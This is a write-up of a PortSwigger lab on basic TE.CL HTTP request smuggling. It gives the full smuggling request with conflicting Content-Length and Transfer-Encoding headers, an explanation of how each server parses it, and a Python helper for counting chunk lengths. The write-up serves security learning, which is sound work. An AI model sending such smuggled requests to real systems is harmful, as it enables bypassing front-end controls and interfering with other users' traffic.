# HTTP request smuggling, basic TE.CL vulnerability

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl), you'll learn: HTTP request smuggling, basic TE.CL vulnerability! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127190609.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127190619.png)

We can try to test the web application is vulnerable to HTTP request smuggling.

Let's send this request to Burp Suite's Repeater:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127190655.png)

First, we can try to test TE.CL HTTP request smuggling, which is the front-end server uses `Transfer-Encoding` header and the back-end server uses `Content-Length` header.

**But before we do that, we need to ensure that the "Update Content-Length" option is unchecked, and show non-printable chars:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127193636.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127193647.png)

**Then, change the request method to POST:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127193747.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127193754.png)

**After that, we can build our smuggling request:**
```http
POST / HTTP/1.1
Host: 0a7700350455b0c2c1d18a7800ee0090.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

65
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 65 (In hex) bytes long, up to the start of the line following `smuggled=yes`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 4 bytes long (`65\r\n`), up to the start of the line following `65`. The following bytes, starting with `GPOST`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

> Note: You need to include the trailing sequence `\r\n\r\n` following the final `0`. Which is pressing "Enter" twice.

**Hence, the smuggled request will be:**
```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

**To count the chunk's length and smuggled `Content-Length`, I'll write a Python script:**
```py
#!/usr/bin/env python3

class Counter:
    def countLength(self, string):
        try:
            print(f'[+] Smuggled Content-Length: {len(string.encode("utf-8"))}')
        except:
            print('[-] Unable to count the smuggled Cotent-Length')

    def countChunkLength(self, string):
        try:
            print(f'[+] Chunk length in decimal: {len(string.encode("utf-8"))}')
            print(f'[+] Chunk length in hex: {hex(len(string.encode("utf-8")))[2:]}')
        except:
            print('[-] Unable to count the chunk length')

def main():
    counter = Counter()

    smuggledContentLengthString = '''\nsmuggled=yes\r\n0\r\n\r\n'''
    counter.countLength(smuggledContentLengthString)

    ChunkLengthString = '''GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nsmuggled=yes'''
    counter.countChunkLength(ChunkLengthString)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/Portswigger-Labs/HTTP-Request-Smuggling)-[2023.01.27|20:23:55(HKT)]
└> python3 count_bytes.py
[+] Smuggled Content-Length: 20
[+] Chunk length in decimal: 101
[+] Chunk length in hex: 65
```

**Chunk length:**
```http
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 20\r\n
\r\n
smuggled=yes
```

**Smuggled `Content-Length`:**
```http
\n
smuggled=yes\r\n
0\r\n
\r\n
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-2/images/Pasted%20image%2020230127201218.png)

We successfully smuggled the GPOST request!

# What we've learned:

1. HTTP request smuggling, basic TE.CL vulnerability